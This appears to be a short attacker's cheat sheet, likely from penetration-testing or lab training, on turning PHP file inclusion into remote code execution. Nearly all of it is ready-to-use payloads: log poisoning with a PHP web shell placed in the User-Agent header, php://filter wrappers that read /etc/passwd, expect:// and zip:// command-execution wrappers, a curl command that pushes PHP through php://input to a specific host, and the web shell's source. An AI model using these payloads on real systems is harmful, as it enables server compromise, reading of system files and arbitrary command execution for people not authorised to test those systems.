# FILE INCLUSION DIRECTORY TRAVERSAL
#web 

## Read log file to RCE 
By adding php code to log file and then read it through file inclusion we have the options to execute php code. 

`User-Agent` to a PHP shell such as `<?php system($_GET['cmd']); ?>`. This gets logged into the file and gets executed by the server as PHP code on inclusion.

`/var/log/apache2/access.log`,`/var/log/nginx/access.log`, `/var/log/sshd.log`, `/var/log/mail`, and `/var/log/vsftpd.log`.

|Command|Description|
|---|---|
|`php://filter/read=convert.base64-encode/resource=/etc/passwd`|PHP filter to convert file contents to Base64|
|`php://filter/read=string.rot13/resource=/etc/passwd`|PHP filter to convert file contents to ROT13|
|`expect://id`|Command execution with PHP `Expect` wrapper|
|`curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input"`|Using PHP `Input` wrapper for command execution|
|`zip://malicious.zip%23exec.php&cmd=id`|Command execution with the PHP `Zip` wrapper|
|`<?php system($_GET['cmd']); ?>`|PHP web shell file contents (i.e., shell.php)|